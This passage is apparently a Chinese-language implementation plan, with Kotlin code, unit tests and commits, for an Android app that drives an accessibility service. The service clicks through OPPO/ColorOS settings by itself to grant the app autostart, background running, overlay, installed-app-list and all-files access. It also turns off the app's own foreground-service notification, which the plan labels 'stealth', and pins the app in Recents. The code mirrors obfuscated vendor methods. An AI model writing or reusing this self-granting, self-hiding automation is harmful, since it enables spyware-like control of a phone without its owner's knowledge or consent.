     * vendor m212318b6:SDK ≥ 35 走设置→应用→自启动管理;SDK < 35 走 openAppDetails + 多开关尝试。
     * 未找到自启动开关时 5 个 SafeCenter ComponentName 兜底(文档"权限 3")。
     */
    open suspend fun executeStep3AutoStart(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP3_AUTOSTART)) {
            logs.add("[Step 3/9] ⏭ 24h 内已完成,跳过")
            return
        }
        logs.add("[Step 3/9] ▶ 自启动 + 后台开始")

        val autoOK = runAutoStartSubSwitch(successes, failures, logs)
        val bgOK = runBackgroundSubSwitch(successes, failures, logs)

        if (autoOK && bgOK) {
            OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP3_AUTOSTART)
            successes.add("[Step 3/9] 自启动+后台整体完成")
        } else {
            logs.add("[Step 3/9] 部分失败,不 mark 整体(autoOK=$autoOK bgOK=$bgOK)")
        }
    }

    /** 自启动开关子任务:SDK 分支 + SafeCenter 兜底 */
    open suspend fun runAutoStartSubSwitch(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        val viaSettings = tryOpenAutoStartViaSettings(successes, failures, logs)
        val ok = if (viaSettings) true else {
            logs.add("[Step 3/9] Settings 路径失败,尝试 SafeCenter 兜底")
            tryOpenAutoStartViaSafeCenter(successes, failures, logs)
        }
        if (ok) OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP3_AUTOSTART_SWITCH)
        return ok
    }

    open suspend fun tryOpenAutoStartViaSettings(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        val sdk = android.os.Build.VERSION.SDK_INT
        if (sdk >= 35) {
            openSettings()
            kotlinx.coroutines.delay(800L)
            clickTextWithScroll("应用", scrollLimit = 5)
            kotlinx.coroutines.delay(400L)
            navigateByHashPath(OppoBatteryPaths.AUTOSTART_ENTRY_PATH)
            kotlinx.coroutines.delay(1500L)
            clickTextWithScroll(appLabel, scrollLimit = 25)
            kotlinx.coroutines.delay(400L)
            return openSwitch(appLabel)
        } else {
            openAppDetails()
            kotlinx.coroutines.delay(800L)
            val switchTexts = listOf("允许自动启动", "允许应用自启动", "自动启动", "允许自启动", "开机自启动")
            for (s in switchTexts) { if (openSwitch(s)) return true }
            return false
        }
    }

    open suspend fun tryOpenAutoStartViaSafeCenter(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        val components = listOf(
            android.content.ComponentName("com.coloros.safecenter",
                "com.coloros.safecenter.permission.startup.StartupAppListActivity"),
            android.content.ComponentName("com.oppo.safe",
                "com.oppo.safe.permission.startup.StartupAppListActivity"),
            android.content.ComponentName("com.oplus.safecenter",
                "com.oplus.safecenter.permission.startup.StartupAppListActivity"),
            android.content.ComponentName("com.coloros.safecenter",
                "com.coloros.safecenter.startupapp.view.StartupAppListActivity"),
            android.content.ComponentName("com.oplus.safecenter",
                "com.oplus.safecenter.startupapp.view.StartupAppListActivity")
        )
        for (c in components) {
            try {
                val i = android.content.Intent().setComponent(c)
                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(i)
                kotlinx.coroutines.delay(1200L)
                // 验证前台包名
                val pkg = try { service?.rootInActiveWindow?.packageName?.toString() ?: "" } catch (_: Exception) { "" }
                if (pkg.contains("safecenter") || pkg.contains("oppo.safe")) {
                    logs.add("[Step 3/9] SafeCenter 已开(${c.packageName})")
                    clickTextWithScroll(appLabel, scrollLimit = 25)
                    kotlinx.coroutines.delay(400L)
                    return openSwitch(appLabel)
                }
            } catch (_: Exception) { continue }
        }
        failures.add("[Step 3/9] SafeCenter 全部 ComponentName 失败")
        return false
    }

    /** 后台行为子任务 */
    open suspend fun runBackgroundSubSwitch(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        openAppDetails()
        kotlinx.coroutines.delay(800L)
        val batteryEntries = listOf("耗电管理", "耗电保护", "电量消耗", "耗电详情", "电池")
        var entered = false
        for (t in batteryEntries) { if (clickText(t)) { entered = true; break } }
        if (!entered) {
            failures.add("[Step 3/9] 未找到耗电管理入口")
            return false
        }
        kotlinx.coroutines.delay(800L)
        val bgTexts = listOf(
            "完全允许后台行为", "允许应用后台行为", "允许完全后台行为",
            "允许后台运行", "完全后台行为", "后台运行", "允许后台活动"
        )
        for (t in bgTexts) {
            if (openSwitch(t)) {
                // 确认对话框
                clickText("允许") || clickText("确定")
                OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP3_AUTOSTART_BACKGROUND)
                return true
            }
        }
        failures.add("[Step 3/9] 后台开关未找到")
        return false
    }
```

### Step 3.4: 运行测试确认通过

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep3AutoStartTest"`

预期:PASS 4 tests

### Step 3.5: Commit

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep3AutoStartTest.kt
git commit -m "feat(oppo): Task3 Step3 自启动+后台 — SafeCenter 5 ComponentName 兜底 + SDK 35 分支"
```

---

## Task 4: Step 4 Overlay(SYSTEM_ALERT_WINDOW)

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`
- Test: `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep4OverlayTest.kt`

**Vendor 对齐:** `OppoStepsSimplified.m212329c7`

### Step 4.1: 写 OppoStep4OverlayTest

- [ ] 创建 `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep4OverlayTest.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.runBlocking
import org.junit.After
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.Mockito.doReturn
import org.mockito.Mockito.mock
import org.mockito.Mockito.spy
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

@RunWith(RobolectricTestRunner::class)
class OppoStep4OverlayTest {
    private lateinit var context: Context
    @Before fun setUp() { context = RuntimeEnvironment.getApplication() }
    @After fun tearDown() { OppoStepCompletionStore.clearAll(context) }

    @Test fun `skips when step4 completed`() = runBlocking {
        OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP4_OVERLAY)
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        val logs = mutableListOf<String>()
        steps.executeStep4Overlay(mutableListOf(), mutableListOf(), logs)
        assertTrue(logs.any { it.contains("跳过") })
    }

    @Test fun `skips and marks when canDrawOverlays true`() = runBlocking {
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        doReturn(true).`when`(steps).canDrawOverlaysNow()
        steps.executeStep4Overlay(mutableListOf(), mutableListOf(), mutableListOf())
        assertTrue(OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP4_OVERLAY))
    }

    @Test fun `marks success when openSwitch returns true`() = runBlocking {
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        doReturn(false).`when`(steps).canDrawOverlaysNow()
        doReturn(Unit).`when`(steps).launchOverlaySettings()
        doReturn(true).`when`(steps).tryOpenOverlaySwitch(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )
        steps.executeStep4Overlay(mutableListOf(), mutableListOf(), mutableListOf())
        assertTrue(OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP4_OVERLAY))
    }
}
```

### Step 4.2: 运行测试确认失败

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep4OverlayTest"`

预期:FAIL with "unresolved reference"

### Step 4.3: 实现 Step 4

- [ ] 修改 `OppoSteps.kt` 添加:

```kotlin
    open suspend fun executeStep4Overlay(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP4_OVERLAY)) {
            logs.add("[Step 4/9] ⏭ 24h 内已完成,跳过"); return
        }
        logs.add("[Step 4/9] ▶ 悬浮窗权限开始")
        if (canDrawOverlaysNow()) {
            logs.add("[Step 4/9] ✓ 系统 canDrawOverlays=true,已有权限")
            successes.add("[Step 4/9] 悬浮窗已授权(前置)")
            OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP4_OVERLAY); return
        }
        launchOverlaySettings()
        kotlinx.coroutines.delay(1200L)
        val ok = tryOpenOverlaySwitch(successes, logs)
        if (ok) {
            OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP4_OVERLAY)
        } else {
            failures.add("[Step 4/9] 悬浮窗开关未点中")
        }
    }

    open fun canDrawOverlaysNow(): Boolean = android.provider.Settings.canDrawOverlays(context)

    open suspend fun launchOverlaySettings() {
        try {
            val i = android.content.Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                .setData(android.net.Uri.parse("package:${context.packageName}"))
                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(i)
        } catch (e: Exception) { android.util.Log.w(TAG, "launchOverlaySettings: ${e.message}") }
    }

    open suspend fun tryOpenOverlaySwitch(
        successes: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        // 1. 滚找 appLabel 进入详情
        clickTextWithScroll(appLabel, scrollLimit = 25)
        kotlinx.coroutines.delay(600L)
        // 2. 按文本开关
        val texts = listOf(
            "授予悬浮窗权限", "允许在其他应用上层显示", "在其他应用上层显示", "显示在其他应用上层",
            "允许显示悬浮窗", "显示悬浮窗"
        )
        for (t in texts) {
            if (openSwitch(t)) {
                clickText("允许")  // 确认对话框
                successes.add("[Step 4/9] 悬浮窗已开启($t)")
                return true
            }
        }
        // 3. 最后兜底直接 clickText("允许")
        if (clickText("允许")) {
            successes.add("[Step 4/9] 悬浮窗 fallback 允许")
            return true
        }
        return false
    }
```

### Step 4.4: 运行测试确认通过

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep4OverlayTest"`

预期:PASS 3 tests

### Step 4.5: Commit

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep4OverlayTest.kt
git commit -m "feat(oppo): Task4 Step4 悬浮窗 — Settings.canDrawOverlays 前置 + 6 文本开关"
```

---

## Task 5: Step 5 Read AppList(ColorOS 独有)

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`
- Test: `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep5AppListTest.kt`

**Vendor 对齐:** `OppoStepsSimplified.m212331c9`

### Step 5.1: 写测试

- [ ] 创建 `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep5AppListTest.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.runBlocking
import org.junit.After
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.Mockito.doReturn
import org.mockito.Mockito.mock
import org.mockito.Mockito.spy
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment
import org.robolectric.annotation.Config

@RunWith(RobolectricTestRunner::class)
class OppoStep5AppListTest {
    private lateinit var context: Context
    @Before fun setUp() { context = RuntimeEnvironment.getApplication() }
    @After fun tearDown() { OppoStepCompletionStore.clearAll(context) }

    @Test @Config(sdk = [30]) fun `marks immediately when SDK below 31`() = runBlocking {
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        steps.executeStep5AppList(mutableListOf(), mutableListOf(), mutableListOf())
        assertTrue(OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP5_APPLIST))
    }

    @Test @Config(sdk = [31]) fun `on SDK 31+ clicks appListSwitch`() = runBlocking {
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        doReturn(true).`when`(steps).tryOpenAppListSwitch(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )
        steps.executeStep5AppList(mutableListOf(), mutableListOf(), mutableListOf())
        assertTrue(OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP5_APPLIST))
    }
}
```

### Step 5.2: 运行测试确认失败

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep5AppListTest"`

预期:FAIL

### Step 5.3: 实现 Step 5

- [ ] 修改 `OppoSteps.kt` 添加:

```kotlin
    open suspend fun executeStep5AppList(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP5_APPLIST)) {
            logs.add("[Step 5/9] ⏭ 24h 内已完成,跳过"); return
        }
        val sdk = android.os.Build.VERSION.SDK_INT
        if (sdk < 31) {
            logs.add("[Step 5/9] SDK=$sdk<31 manifest 自动授予,直接 mark")
            successes.add("[Step 5/9] AppList 自动授予")
            OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP5_APPLIST); return
        }
        logs.add("[Step 5/9] ▶ 读取应用列表开始(SDK=$sdk)")
        openAppDetails()
        kotlinx.coroutines.delay(800L)
        val ok = tryOpenAppListSwitch(successes, logs)
        if (ok) {
            OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP5_APPLIST)
        } else {
            failures.add("[Step 5/9] AppList 开关未点中")
        }
    }

    open suspend fun tryOpenAppListSwitch(
        successes: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        clickTextWithScroll("权限管理", scrollLimit = 3) || clickTextWithScroll("权限", scrollLimit = 3)
        kotlinx.coroutines.delay(600L)
        val texts = listOf("读取已安装应用列表", "读取已安装应用", "获取已安装应用", "查看已安装应用", "应用列表")
        for (t in texts) {
            if (clickTextWithScroll(t, scrollLimit = 10)) {
                kotlinx.coroutines.delay(400L)
                if (clickText("允许")) { successes.add("[Step 5/9] AppList 允许点中"); return true }
            }
        }
        return false
    }
```

### Step 5.4: 运行测试确认通过

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep5AppListTest"`

预期:PASS 2 tests

### Step 5.5: Commit

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep5AppListTest.kt
git commit -m "feat(oppo): Task5 Step5 读取应用列表(ColorOS 独有,SDK 31+ runtime)"
```

---

## Task 6: Step 6 All Files Access(MANAGE_EXTERNAL_STORAGE)

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`
- Test: `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep6FileAccessTest.kt`

### Step 6.1: 写测试

- [ ] 创建 `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep6FileAccessTest.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.runBlocking
import org.junit.After
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.Mockito.doReturn
import org.mockito.Mockito.mock
import org.mockito.Mockito.spy
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment
import org.robolectric.annotation.Config

@RunWith(RobolectricTestRunner::class)
class OppoStep6FileAccessTest {
    private lateinit var context: Context
    @Before fun setUp() { context = RuntimeEnvironment.getApplication() }
    @After fun tearDown() { OppoStepCompletionStore.clearAll(context) }

    @Test @Config(sdk = [29]) fun `skips when SDK below 30`() = runBlocking {
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        val logs = mutableListOf<String>()
        steps.executeStep6FileAccess(mutableListOf(), mutableListOf(), logs)
        assertTrue(logs.any { it.contains("SDK") })
    }

    @Test @Config(sdk = [30]) fun `skips when isExternalStorageManager true`() = runBlocking {
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        doReturn(true).`when`(steps).isExternalStorageManagerNow()
        steps.executeStep6FileAccess(mutableListOf(), mutableListOf(), mutableListOf())
        assertTrue(OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP6_FILEACCESS))
    }

    @Test @Config(sdk = [30]) fun `marks success when tryToggleFileAccess true`() = runBlocking {
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        doReturn(false).`when`(steps).isExternalStorageManagerNow()
        doReturn(Unit).`when`(steps).launchFileAccessSettings()
        doReturn(true).`when`(steps).tryToggleFileAccess(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )
        steps.executeStep6FileAccess(mutableListOf(), mutableListOf(), mutableListOf())
        assertTrue(OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP6_FILEACCESS))
    }
}
```

### Step 6.2: 运行测试确认失败

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep6FileAccessTest"`

预期:FAIL

### Step 6.3: 实现 Step 6

- [ ] 修改 `OppoSteps.kt` 添加:

```kotlin
    open suspend fun executeStep6FileAccess(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP6_FILEACCESS)) {
            logs.add("[Step 6/9] ⏭ 24h 内已完成,跳过"); return
        }
        val sdk = android.os.Build.VERSION.SDK_INT
        if (sdk < 30) { logs.add("[Step 6/9] SDK=$sdk<30 不需要,跳过"); return }
        if (isExternalStorageManagerNow()) {
            successes.add("[Step 6/9] 已有 MANAGE_EXTERNAL_STORAGE")
            OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP6_FILEACCESS); return
        }
        logs.add("[Step 6/9] ▶ 所有文件访问开始")
        launchFileAccessSettings()
        kotlinx.coroutines.delay(1500L)
        val ok = tryToggleFileAccess(successes, logs)
        if (ok) {
            OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP6_FILEACCESS)
        } else {
            failures.add("[Step 6/9] 所有文件访问未开启")
        }
    }

    open fun isExternalStorageManagerNow(): Boolean {
        return if (android.os.Build.VERSION.SDK_INT >= 30) android.os.Environment.isExternalStorageManager() else true
    }

    open suspend fun launchFileAccessSettings() {
        try {
            val i = android.content.Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                .setData(android.net.Uri.parse("package:${context.packageName}"))
                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(i)
        } catch (e: Exception) { android.util.Log.w(TAG, "launchFileAccessSettings: ${e.message}") }
    }

    open suspend fun tryToggleFileAccess(
        successes: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        val switches = listOf(
            "授予所有文件的管理权限", "所有文件访问权限", "授予管理所有文件的权限",
            "允许访问所有文件", "允许管理所有文件"
        )
        var toggled = false
        for (s in switches) { if (openSwitch(s)) { toggled = true; break } }
        if (!toggled) {
            // 按钮路径
            for (b in listOf("开启", "Enable", "Turn on")) { if (clickText(b)) { toggled = true; break } }
        }
        if (!toggled) return false
        kotlinx.coroutines.delay(800L)
        // 按 Android 版本分支处理确认对话框
        val sdk = android.os.Build.VERSION.SDK_INT
        when {
            sdk in 29..31 -> listOf("确定", "OK", "允许", "Allow", "我知道了", "Got it").any { clickText(it) }
            sdk == 32 -> listOf("确定", "应用", "允许").any { clickText(it) }
            sdk == 33 -> { clickText("确定"); kotlinx.coroutines.delay(400L); clickText("允许") }
            sdk >= 34 -> listOf("允许", "授予权限", "确定").any { clickText(it) }
            else -> clickText("确定")
        }
        kotlinx.coroutines.delay(800L)
        val granted = isExternalStorageManagerNow()
        if (granted) successes.add("[Step 6/9] MANAGE_EXTERNAL_STORAGE 已获取")
        return granted
    }
```

### Step 6.4: 运行测试确认通过

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep6FileAccessTest"`

预期:PASS 3 tests

### Step 6.5: Commit

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep6FileAccessTest.kt
git commit -m "feat(oppo): Task6 Step6 文件访问 — Environment.isExternalStorageManager + Android 版本分支确认按钮"
```

---

## Task 7: Step 7 Notification OFF Channel(隐身)

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`
- Test: `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep7NotificationTest.kt`

**Vendor 对齐:** `OppoStepsSimplified.m212327c5` — `closeSwitch("允许通知")` 关闭 `"OFF"` 渠道(隐藏前台服务通知)

### Step 7.1: 写测试

- [ ] 创建 `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep7NotificationTest.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.runBlocking
import org.junit.After
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.Mockito.doReturn
import org.mockito.Mockito.mock
import org.mockito.Mockito.spy
import org.mockito.Mockito.verify
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

@RunWith(RobolectricTestRunner::class)
class OppoStep7NotificationTest {
    private lateinit var context: Context
    @Before fun setUp() { context = RuntimeEnvironment.getApplication() }
    @After fun tearDown() { OppoStepCompletionStore.clearAll(context) }

    @Test fun `skips when step7 completed`() = runBlocking {
        OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP7_NOTIFICATION)
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        val logs = mutableListOf<String>()
        steps.executeStep7Notification(mutableListOf(), mutableListOf(), logs)
        assertTrue(logs.any { it.contains("跳过") })
    }

    @Test fun `launches CHANNEL_NOTIFICATION_SETTINGS with OFF channel`() = runBlocking {
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        doReturn(true).`when`(steps).tryCloseOffChannelSwitch(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )
        steps.executeStep7Notification(mutableListOf(), mutableListOf(), mutableListOf())
        verify(steps).launchChannelSettings("OFF")
    }

    @Test fun `marks success when closeSwitch returns true`() = runBlocking {
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        doReturn(Unit).`when`(steps).launchChannelSettings(org.mockito.ArgumentMatchers.anyString())
        doReturn(true).`when`(steps).tryCloseOffChannelSwitch(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )
        steps.executeStep7Notification(mutableListOf(), mutableListOf(), mutableListOf())
        assertTrue(OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP7_NOTIFICATION))
    }
}
```

### Step 7.2: 运行测试确认失败

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep7NotificationTest"`

预期:FAIL

### Step 7.3: 实现 Step 7

- [ ] 修改 `OppoSteps.kt` 添加:

```kotlin
    open suspend fun executeStep7Notification(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP7_NOTIFICATION)) {
            logs.add("[Step 7/9] ⏭ 24h 内已完成,跳过"); return
        }
        logs.add("[Step 7/9] ▶ 关闭 OFF 通知渠道开始")
        launchChannelSettings("OFF")
        kotlinx.coroutines.delay(800L)
        val ok = tryCloseOffChannelSwitch(successes, logs)
        if (ok) {
            OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP7_NOTIFICATION)
        } else {
            failures.add("[Step 7/9] OFF 通知关闭失败")
        }
    }

    open suspend fun launchChannelSettings(channelId: String) {
        try {
            val i = android.content.Intent("android.settings.CHANNEL_NOTIFICATION_SETTINGS")
                .putExtra("android.provider.extra.APP_PACKAGE", context.packageName)
                .putExtra("android.provider.extra.CHANNEL_ID", channelId)
                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(i)
        } catch (e: Exception) { android.util.Log.w(TAG, "launchChannelSettings: ${e.message}") }
    }

    open suspend fun tryCloseOffChannelSwitch(
        successes: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        // 轮询最多 6 次(每次 500ms)等页面加载
        repeat(6) {
            if (closeSwitch("允许通知")) {
                pressBack()
                successes.add("[Step 7/9] 允许通知 已关闭")
                return true
            }
            kotlinx.coroutines.delay(500L)
        }
        return false
    }
```

### Step 7.4: 运行测试确认通过

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep7NotificationTest"`

预期:PASS 3 tests

### Step 7.5: Commit

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep7NotificationTest.kt
git commit -m "feat(oppo): Task7 Step7 OFF 通知渠道关闭 — CHANNEL_NOTIFICATION_SETTINGS + closeSwitch"
```

---

## Task 8: Step 8 Recent Task Lock

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`
- Test: `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep8RecentTaskLockTest.kt`

**Vendor 对齐:** `OppoStepsSimplified.m212328c6` — performGlobalAction(RECENTS) + 水平滑动 + 锁定按钮多语言

### Step 8.1: 写测试

- [ ] 创建 `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep8RecentTaskLockTest.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.accessibilityservice.AccessibilityService
import android.content.Context
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.runBlocking
import org.junit.After
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.Mockito.doReturn
import org.mockito.Mockito.mock
import org.mockito.Mockito.spy
import org.mockito.Mockito.verify
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

@RunWith(RobolectricTestRunner::class)
class OppoStep8RecentTaskLockTest {
    private lateinit var context: Context
    @Before fun setUp() { context = RuntimeEnvironment.getApplication() }
    @After fun tearDown() { OppoStepCompletionStore.clearAll(context) }

    @Test fun `skips when step8 completed`() = runBlocking {
        OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP8_APPLOCK)
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        val logs = mutableListOf<String>()
        steps.executeStep8RecentTaskLock(mutableListOf(), mutableListOf(), logs)
        assertTrue(logs.any { it.contains("跳过") })
    }

    @Test fun `triggers GLOBAL_ACTION_RECENTS when not locked`() = runBlocking {
        val svc = mock(MyAccessibilityService::class.java)
        val steps = spy(OppoSteps(svc, context))
        doReturn(true).`when`(steps).tryLockAppCard(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )
        steps.executeStep8RecentTaskLock(mutableListOf(), mutableListOf(), mutableListOf())
        verify(svc).performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
    }
}
```

### Step 8.2: 运行测试确认失败

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep8RecentTaskLockTest"`

预期:FAIL

### Step 8.3: 实现 Step 8

- [ ] 修改 `OppoSteps.kt` 添加:

```kotlin
    open suspend fun executeStep8RecentTaskLock(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP8_APPLOCK)) {
            logs.add("[Step 8/9] ⏭ 24h 内已完成,跳过"); return
        }
        val svc = service ?: run { failures.add("[Step 8/9] service=null"); return }
        logs.add("[Step 8/9] ▶ 最近任务锁定开始")

        // 1. 回到 app 前台(launch 自身)
        try {
            val launch = context.packageManager.getLaunchIntentForPackage(context.packageName)
            launch?.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            launch?.let { context.startActivity(it) }
            kotlinx.coroutines.delay(500L)
        } catch (_: Exception) {}

        // 2. performGlobalAction(RECENTS)
        try { svc.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS) } catch (_: Exception) {}
        kotlinx.coroutines.delay(1200L)

        // 3. 水平滑动激活任务卡(80%w→20%w,40%h,400ms)
        horizontalSwipeToActivate()
        kotlinx.coroutines.delay(500L)

        val ok = tryLockAppCard(successes, logs)
        if (ok) {
            OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP8_APPLOCK)
        } else {
            failures.add("[Step 8/9] 未能锁定 app 卡片")
        }
